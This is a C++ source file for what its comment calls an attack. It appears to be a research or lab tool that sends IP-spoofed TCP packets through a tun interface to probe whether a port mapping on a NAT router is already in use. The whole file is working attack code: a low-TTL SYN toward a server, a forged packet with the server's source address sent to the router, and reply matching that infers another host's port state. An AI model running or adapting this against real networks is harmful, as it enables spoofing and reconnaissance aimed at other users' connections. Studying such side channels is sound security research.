#include <iostream>
#include <limits>
#include <optional>
#include <random>
#include <thread>

#include "tcp-interface.hpp"
#include "tcp-packet.hpp"

#include "app.hpp"

/** \brief Actually run the attack given a configuration */
static RunStatus run(Configuration &config);
/** \brief Send a packet, honoring the delay and redundancy settings */
static void send_pkt(Configuration &config, const TCPPacket &packet);

int main(int argc, char **argv) {

  // Create the interface over which we'll be sending packets. By default, this
  // is `tun0`.
  TCPInterface interface;

  // Create the configuration for this run
  // TODO: Generate dynamically
  Configuration config{
      .interface = interface,
      .topology =
          {
              .server_addr =
                  {
                      .ip = 0x0af48105,
                      .port = 2440,
                  },
              .router_ip = 0x0af48104,
              .attacker_ip = 0x0af40180,
              .server_ttl_drop = 3,
          },
      .scan_port = 40917,
      .timeout = std::chrono::milliseconds(1000),
      .packet_delay = std::chrono::milliseconds(500),
      .packet_redundancy = 2,
  };

  RunStatus result = run(config);
  if (result == RunStatus::FREE) {
    std::cout << "Port is free" << std::endl;
  } else {
    std::cout << "Port is occupied" << std::endl;
  }
}

static RunStatus run(Configuration &config) {

  // Compute the attacker and router address given the configuration
  TCPPacket::Address attacker_addr{
      .ip = config.topology.attacker_ip,
      .port = config.scan_port,
  };
  TCPPacket::Address router_addr{
      .ip = config.topology.router_ip,
      .port = config.scan_port,
  };

  // Get a random number for the initial sequence numbers on both sides.
  // Remember to seed with a read random number generator.
  std::random_device truerandom_engine{};
  std::default_random_engine isn_engine{truerandom_engine()};
  std::uniform_int_distribution<uint32_t> isn_dist{
      0, std::numeric_limits<uint32_t>::max()};
  uint32_t attacker_isn = isn_dist(isn_engine);
  uint32_t server_isn = isn_dist(isn_engine);

  // Send a SYN packet to the server
  send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
                       .ttl = config.topology.server_ttl_drop,
                       .seqno = attacker_isn,
                       .ackno = std::nullopt,
                       .syn = true,
                   });

  // Send a spoofed packet from the server to the router
  TCPPacket spoofed_to_router{
      .src = config.topology.server_addr,
      .dst = router_addr,
      .seqno = server_isn,
      .ackno = attacker_isn + 1,
      .syn = true,
      .fin = false,
  };
  send_pkt(config, spoofed_to_router);
  // The response we get back will have the destination changed. Remember that
  // and check incoming packets against it.
  TCPPacket spoofed_to_attacker = spoofed_to_router;
  spoofed_to_attacker.dst = attacker_addr;

  // Check to see if we actually received it. Make sure the attributes of the
  // packet match what we're expecting, otherwise, it could've been from an old
  // probe.
  std::optional<TCPPacket> response = config.interface.receive(
      [&spoofed_to_attacker](const TCPPacket &pkt) -> bool {
        // Ignore reset packets
        if (pkt.rst)
          return false;
        // Check that all the attributes match exactly, except for the TTL field
        return pkt == spoofed_to_attacker;
      },
      config.timeout);

  // If we didn't get anything, it means someone else is using this port
  if (!response.has_value()) {
    return RunStatus::OCCUPIED;
  }
  // Otherwise, we have this port free. We don't need to do any cleanup since
  // the packet is in SYN_RECV and not ESTABLISHED.
  return RunStatus::FREE;
}

static void send_pkt(Configuration &config, const TCPPacket &packet) {
  for (size_t i = 0; i < config.packet_redundancy; i++) {
    config.interface.send(packet);
    std::this_thread::sleep_for(config.packet_delay);
  }
}
